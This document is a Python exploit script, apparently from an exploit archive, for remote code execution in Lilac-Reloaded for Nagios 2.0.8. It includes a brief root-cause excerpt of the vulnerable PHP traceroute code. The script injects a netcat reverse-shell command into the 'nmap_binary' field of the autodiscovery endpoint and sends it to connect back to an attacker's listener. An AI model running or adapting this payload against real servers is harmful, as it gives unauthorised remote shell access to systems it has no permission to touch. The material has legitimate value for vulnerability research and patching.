@@ -1,0 +1,74 @@
+id: 38605
+date: 04/20/2023
+title: Lilac-Reloaded for Nagios 2.0.8 - Remote Code Execution Exploit
+author: Zoltan Padanyi
+cves: 
+
+#!/usr/bin/env python
+
+"""
+# Exploit Title: Lilac-Reloaded for Nagios 2.0.8 - Remote Code Execution (RCE)
+# Exploit Author: max / Zoltan Padanyi
+# Vendor Homepage: https://exchange.nagios.org/directory/Addons/Configuration/Lilac-2DReloaded/visit
+# Software Link: https://sourceforge.net/projects/lilac--reloaded/files/latest/download
+# Version: 2.0.8
+# Tested on: Debian 7.6
+# CVE : N/A
+
+The autodiscovery feature lacks any kind of input filtering, so we can add our own commands there terminated with a ;
+
+Use at your own risk!
+
+RCA - wild exec is ongoing without any filtering
+
+in library/Net/Traceroute.php
+
+   181	    function _setTraceroutePath($sysname)
+   182	    {
+   183	        $status    = '';
+   184	        $output    = array();
+   185	        $traceroute_path = '';
+   186
+   187	        if ("windows" == $sysname) {
+   188	            return "tracert";
+   189	        } else {
+   190	            $traceroute_path = exec("which traceroute", $output, $status);
+   [...]
+   257	    function traceroute($host)
+   258	    {
+   259
+   260	        $argList = $this->_createArgList();
+   261	        $cmd = $this->_traceroute_path." ".$argList[0]." ".$host." ".$argList[1];
+   262	        exec($cmd, $this->_result);
+
+
+"""
+
+import requests
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url", help="The full path of the autodiscover.php in lilac (i.e. http://127.0.0.1/lilac/autodiscovery.php", required=True)
+parser.add_argument("-i", "--ip", help="Listener IP", required=True)
+parser.add_argument("-p", "--port", help="Listener port", required=True, type=int)
+args = parser.parse_args()
+
+rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f;"
+
+body = {"request":"autodiscover","job_name":"HackThePlanet","job_description":"HackThePlanet","nmap_binary":rev_shell,"default_template":"","target[2]":"1.1.1.1"}
+
+try:
+    r = requests.get(args.url)
+    if r.ok:
+	    print("[+] URL looks good...moving forward...")
+	    print("[+] Sending exploit in...")
+	    r = requests.post(args.url,data=body)
+	    if r.ok:
+		    print("[+] Got HTTP 200, check your listener!")
+    else:
+	    print("[-] Some kind of error happened, check the http response below!")
+	    print(r.text)
+except Exception as e:
+	print("General exception: " + str(e))
+
+#  0day.today [2023-04-21]  #
